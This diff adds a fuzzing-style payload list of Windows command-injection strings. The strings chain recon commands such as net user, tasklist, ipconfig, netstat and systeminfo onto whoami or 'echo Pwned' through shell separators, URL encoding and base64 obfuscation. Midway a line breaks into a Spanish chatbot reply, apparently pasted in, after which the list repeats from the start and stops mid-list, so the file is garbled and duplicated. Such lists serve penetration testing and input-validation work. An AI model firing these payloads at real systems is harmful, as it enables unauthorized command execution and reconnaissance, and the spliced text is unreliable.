@@ -1,0 +1,386 @@
+whoami&dir
+whoami%26dir
+whoami&&dir
+whoami%26%26dir
+whoami|dir
+whoami%7cdir
+whoami||dir
+whoami%7c%7cdir
+whoami`dir`
+whoami%60%60dir
+whoami$()dir
+whoami%24%28%29dir
+dir&echo Pwned
+dir%26echo Pwned
+dir&&echo Pwned
+dir%26%26echo Pwned
+dir|echo Pwned
+dir%7cecho Pwned
+dir||echo Pwned
+dir%7c%7cecho Pwned
+dir`echo Pwned`
+dir%60%60echo Pwned
+dir$()echo Pwned
+dir%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;dir
+echo${LS_COLORS:10:1}dir;dir
+$(tr '!-}' '"-~'<<<[);dir
+echo -n 'dir' | base64;dir
+cmd<<<$(base64 -d<<<ZGlyKQ==);dir
+whoami&net user
+whoami%26net user
+whoami&&net user
+whoami%26%26net user
+whoami|net user
+whoami%7cnet user
+whoami||net user
+whoami%7c%7cnet user
+whoami`net user`
+whoami%60%60net user
+whoami$()net user
+whoami%24%28%29net user
+net user&echo Pwned
+net user%26echo Pwned
+net user&&echo Pwned
+net user%26%26echo Pwned
+net user|echo Pwned
+net user%7cecho Pwned
+net user||echo Pwned
+net user%7c%7cecho Pwned
+net user`echo Pwned`
+net user%60%60echo Pwned
+net user$()echo Pwned
+net user%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;net user
+echo${LS_COLORS:10:1}net user;net user
+$(tr '!-}' '"-~'<<<[);net user
+echo -n 'net user' | base64;net user
+cmd<<<$(base64 -d<<<bmV0IHVzZXI=);net user
+whoami&tasklist
+whoami%26tasklist
+whoami&&tasklist
+whoami%26%26tasklist
+whoami|tasklist
+whoami%7ctasklist
+whoami||tasklist
+whoami%7c%7ctasklist
+whoami`tasklist`
+whoami%60%60tasklist
+whoami$()tasklist
+whoami%24%28%29tasklist
+tasklist&echo Pwned
+tasklist%26echo Pwned
+tasklist&&echo Pwned
+tasklist%26%26echo Pwned
+tasklist|echo Pwned
+tasklist%7cecho Pwned
+tasklist||echo Pwned
+tasklist%7c%7cecho Pwned
+tasklist`echo Pwned`
+tasklist%60%60echo Pwned
+tasklist$()echo Pwned
+tasklist%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;tasklist
+echo${LS_COLORS:10:1}tasklist;tasklist
+$(tr '!-}' '"-~'<<<[);tasklist
+echo -n 'tasklist' | base64;tasklist
+cmd<<<$(base64 -d<<<dGFza2xpc3Q=);tasklist
+whoami&ipconfig
+whoami%26ipconfig
+whoami&&ipconfig
+whoami%26%26ipconfig
+whoami|ipconfig
+whoami%7cipconfig
+whoami||ipconfig
+whoami%7c%7cipconfig
+whoami`ipconfig`
+whoami%60%60ipconfig
+whoami$()ipconfig
+whoami%24%28%29ipconfig
+ipconfig&echo Pwned
+ipconfig%26echo Pwned
+ipconfig&&echo Pwned
+ipconfig%26%26echo Pwned
+ipconfig|echo Pwned
+ipconfig%7cecho Pwned
+ipconfig||echo Pwned
+ipconfig%7c%7cecho Pwned
+ipconfig`echo Pwned`
+ipconfig%60%60echo Pwned
+ipconfig$()echo Pwned
+ipconfig%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;ipconfig
+echo${LS_COLORS:10:1}ipconfig;ipconfig
+$(tr '!-}' '"-~'<<<[);ipconfig
+echo -n 'ipconfig' | base64;ipconfig
+cmd<<<$(base64 -d<<<aXBjb25maWc=);ipconfig
+whoami&netstat -an
+whoami%26netstat -an
+whoami&&netstat -an
+whoami%26%26netstat -an
+whoami|netstat -an
+whoami%7cnetstat -an
+whoami||netstat -an
+whoami%7c%7cnetstat -an
+whoami`netstat -an`
+whoami%60%60netstat -an
+whoami$()netstat -an
+whoami%24%28%29netstat -an
+netstat -an&echo Pwned
+netstat -an%26echo Pwned
+netstat -an&&echo Pwned
+netstat -an%26%26echo Pwned
+netstat -an|echo Pwned
+netstat -an%7cecho Pwned
+netstat -an||echo Pwned
+netstat -an%7c%7cecho Pwned
+netstat -an`echo Pwned`
+netstat -an%60%60echo Pwned
+netstat -an$()echo Pwned
+netstat -an%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;netstat -an
+echo${LS_COLORS:10:1}netstat -an;netstat -an
+$(tr '!-}' '"-~'<<<[);netstat -an
+echo -n 'netstat -an' | base64;netstat -an
+cmd<<<$(base64 -d<<<bmV0c3RhdCAtYW4=);netstat -an
+whoami&ping 127.0.0.1
+whoami%26ping 127.0.0.1
+whoami&&ping 127.0.0.1
+whoami%26%26ping 127.0.0.1
+whoami|ping 127.0.0.1
+whoami%7cping 127.0.0.1
+whoami||ping 127.0.0.1
+whoami%7c%7cping 127.0.0.1
+whoami`ping 127.0.0.1`
+whoami%60%60ping 127.0.0.1
+whoami$()ping 127.0.0.1
+whoami%24%28%29ping 127.0.0.1
+ping 127.0.0.1&echo Pwned
+ping 127.0.0.1%26echo Pwned
+ping 127.0.0.1&&echo Pwned
+ping 127.0.0.1%26%26echo Pwned
+ping 127.0.0.1|echo Pwned
+ping 127.0.0.1%7cecho Pwned
+ping 127.0.0.1||echo Pwned
+ping 127.0.0.1%7c%7cecho Pwned
+ping 127.0.0.1`echo Pwned`
+ping 127.0.0.1%60%60echo Pwned
+ping 127.0.0.1$()echo Pwned
+ping 127.0.0.1%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;ping 127.0.0.1
+echo${LS_COLORS:10:1}ping;ping 127.0.0.1
+$(tr '!-}' '"-~'<<<[);ping 127.0.0.1
+echo -n 'ping 127.0.0.1' | base64;ping 127.0.0.1
+cmd<<<$(base64 -d<<<cGluZyAxMjcuMC4wLjE=);ping 127.0.0.1
+whoami&systeminfo
+whoami%26systeminfo
+whoami&&systeminfo
+whoami%26%26systeminfo
+whoami|systeminfo
+whoami%7csysteminfo
+whoami||systeminfo
+whoami%7c%7csysteminfo
+whoami`systeminfo`
+whoami%60%60systeminfo
+whoami$()systeminfo
+whoami%24%28%29systeminfo
+systeminfo&echo Pwned
+systeminfo%26echo Pwned
+systeminfo&&echo Pwned
+systeminfo%26%26echo Pwned
+systeminfo|echo Pwned
+systeminfo%7cecho Pwned
+systeminfoClaro, continuando con la generación de combinaciones posibles de inyecciones de comando en Windows, omitiendo comandos no deseados y tomando en cuenta la tabla proporcionada:
+
+```txt
+whoami&dir
+whoami%26dir
+whoami&&dir
+whoami%26%26dir
+whoami|dir
+whoami%7cdir
+whoami||dir
+whoami%7c%7cdir
+whoami`dir`
+whoami%60%60dir
+whoami$()dir
+whoami%24%28%29dir
+dir&echo Pwned
+dir%26echo Pwned
+dir&&echo Pwned
+dir%26%26echo Pwned
+dir|echo Pwned
+dir%7cecho Pwned
+dir||echo Pwned
+dir%7c%7cecho Pwned
+dir`echo Pwned`
+dir%60%60echo Pwned
+dir$()echo Pwned
+dir%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;dir
+echo${LS_COLORS:10:1}dir;dir
+$(tr '!-}' '"-~'<<<[);dir
+echo -n 'dir' | base64;dir
+cmd<<<$(base64 -d<<<ZGlyKQ==);dir
+whoami&net user
+whoami%26net user
+whoami&&net user
+whoami%26%26net user
+whoami|net user
+whoami%7cnet user
+whoami||net user
+whoami%7c%7cnet user
+whoami`net user`
+whoami%60%60net user
+whoami$()net user
+whoami%24%28%29net user
+net user&echo Pwned
+net user%26echo Pwned
+net user&&echo Pwned
+net user%26%26echo Pwned
+net user|echo Pwned
+net user%7cecho Pwned
+net user||echo Pwned
+net user%7c%7cecho Pwned
+net user`echo Pwned`
+net user%60%60echo Pwned
+net user$()echo Pwned
+net user%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;net user
+echo${LS_COLORS:10:1}net user;net user
+$(tr '!-}' '"-~'<<<[);net user
+echo -n 'net user' | base64;net user
+cmd<<<$(base64 -d<<<bmV0IHVzZXI=);net user
+whoami&tasklist
+whoami%26tasklist
+whoami&&tasklist
+whoami%26%26tasklist
+whoami|tasklist
+whoami%7ctasklist
+whoami||tasklist
+whoami%7c%7ctasklist
+whoami`tasklist`
+whoami%60%60tasklist
+whoami$()tasklist
+whoami%24%28%29tasklist
+tasklist&echo Pwned
+tasklist%26echo Pwned
+tasklist&&echo Pwned
+tasklist%26%26echo Pwned
+tasklist|echo Pwned
+tasklist%7cecho Pwned
+tasklist||echo Pwned
+tasklist%7c%7cecho Pwned
+tasklist`echo Pwned`
+tasklist%60%60echo Pwned
+tasklist$()echo Pwned
+tasklist%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;tasklist
+echo${LS_COLORS:10:1}tasklist;tasklist
+$(tr '!-}' '"-~'<<<[);tasklist
+echo -n 'tasklist' | base64;tasklist
+cmd<<<$(base64 -d<<<dGFza2xpc3Q=);tasklist
+whoami&ipconfig
+whoami%26ipconfig
+whoami&&ipconfig
+whoami%26%26ipconfig
+whoami|ipconfig
+whoami%7cipconfig
+whoami||ipconfig
+whoami%7c%7cipconfig
+whoami`ipconfig`
+whoami%60%60ipconfig
+whoami$()ipconfig
+whoami%24%28%29ipconfig
+ipconfig&echo Pwned
+ipconfig%26echo Pwned
+ipconfig&&echo Pwned
+ipconfig%26%26echo Pwned
+ipconfig|echo Pwned
+ipconfig%7cecho Pwned
+ipconfig||echo Pwned
+ipconfig%7c%7cecho Pwned
+ipconfig`echo Pwned`
+ipconfig%60%60echo Pwned
+ipconfig$()echo Pwned
+ipconfig%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;ipconfig
+echo${LS_COLORS:10:1}ipconfig;ipconfig
+$(tr '!-}' '"-~'<<<[);ipconfig
+echo -n 'ipconfig' | base64;ipconfig
+cmd<<<$(base64 -d<<<aXBjb25maWc=);ipconfig
+whoami&netstat -an
+whoami%26netstat -an
+whoami&&netstat -an
+whoami%26%26netstat -an
+whoami|netstat -an
+whoami%7cnetstat -an
+whoami||netstat -an
+whoami%7c%7cnetstat -an
+whoami`netstat -an`
+whoami%60%60netstat -an
+whoami$()netstat -an
+whoami%24%28%29netstat -an
+netstat -an&echo Pwned
+netstat -an%26echo Pwned
+netstat -an&&echo Pwned
+netstat -an%26%26echo Pwned
+netstat -an|echo Pwned
+netstat -an%7cecho Pwned
+netstat -an||echo Pwned
+netstat -an%7c%7cecho Pwned
+netstat -an`echo Pwned`
+netstat -an%60%60echo Pwned
+netstat -an$()echo Pwned
+netstat -an%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;netstat -an
+echo${LS_COLORS:10:1}netstat -an;netstat -an
+$(tr '!-}' '"-~'<<<[);netstat -an
+echo -n 'netstat -an' | base64;netstat -an
+cmd<<<$(base64 -d<<<bmV0c3RhdCAtYW4=);netstat -an
+whoami&ping 127.0.0.1
+whoami%26ping 127.0.0.1
+whoami&&ping 127.0.0.1
+whoami%26%26ping 127.0.0.1
+whoami|ping 127.0.0.1
+whoami%7cping 127.0.0.1
+whoami||ping 127.0.0.1
+whoami%7c%7cping 127.0.0.1
+whoami`ping 127.0.0.1`
+whoami%60%60ping 127.0.0.1
+whoami$()ping 127.0.0.1
+whoami%24%28%29ping 127.0.0.1
+ping 127.0.0.1&echo Pwned
+ping 127.0.0.1%26echo Pwned
+ping 127.0.0.1&&echo Pwned
+ping 127.0.0.1%26%26echo Pwned
+ping 127.0.0.1|echo Pwned
+ping 127.0.0.1%7cecho Pwned
+ping 127.0.0.1||echo Pwned
+ping 127.0.0.1%7c%7cecho Pwned
+ping 127.0.0.1`echo Pwned`
+ping 127.0.0.1%60%60echo Pwned
+ping 127.0.0.1$()echo Pwned
+ping 127.0.0.1%24%28%29echo Pwned
+echo${PATH:0:1}Windows${PATH:0:1}System32;ping 127.0.0.1
+echo${LS_COLORS:10:1}ping;ping 127.0.0.1
+$(tr '!-}' '"-~'<<<[);ping 127.0.0.1
+echo -n 'ping 127.0.0.1' | base64;ping 127.0.0.1
+cmd<<<$(base64 -d<<<cGluZyAxMjcuMC4wLjE=);ping 127.0.0.1
+whoami&systeminfo
+whoami%26systeminfo
+whoami&&systeminfo
+whoami%26%26systeminfo
+whoami|systeminfo
+whoami%7csysteminfo
+whoami||systeminfo
+whoami%7c%7csysteminfo
+whoami`systeminfo`
+whoami%60%60systeminfo
+whoami$()systeminfo
+whoami%24%28%29systeminfo
+systeminfo&echo Pwned
+systeminfo%26echo Pwned
+systeminfo&&echo Pwned
+systeminfo%26%26echo Pwned
+systeminfo|echo Pwned
